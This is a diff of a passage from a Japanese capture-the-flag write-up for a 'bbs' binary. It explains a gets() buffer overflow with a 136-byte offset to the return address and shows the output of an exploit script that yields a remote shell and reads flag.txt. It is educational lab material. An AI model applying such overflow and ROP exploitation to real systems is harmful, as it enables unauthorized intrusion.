@@ -86,8 +86,6 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		4	bbs
 ```
 
-```
-
 このバイナリでもgetsを使っておりバッファオーバーフローが起きる。144バイト入力したところでcoreを見てみると、ripが4006f9のret命令実行直前でrspに`0x4141414141414141`がある。つまりreturn addressまで136バイトのオフセットであることが分かる。
 ```
 $ python -c 'print "A"*144'|./bbs 
@@ -121,25 +119,23 @@ gef➤
 
 ```
 
+
 ```
-$ python exp_bbs.py -r
-libc:  0x7f2d59871000
-binsh:  0x7f2d599fdd57
+$ python exp_bbs2.py -r
 Input Content : 
 ==============================
 
-Sun May 27 13:48:27 JST 2018
+Sun May 27 14:54:13 JST 2018
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAc@
 
 ==============================
 id
-uid=20209 gid=20000(bbs) groups=20000(bbs)
+uid=20249 gid=20000(bbs) groups=20000(bbs)
 ls
 bbs
 flag.txt
 cat flag.txt
 ctf4b{Pr3p4r3_4rgum3n75_w17h_ROP_4nd_c4ll_4rb17r4ry_func710n5}
-
 ```
 
 ***
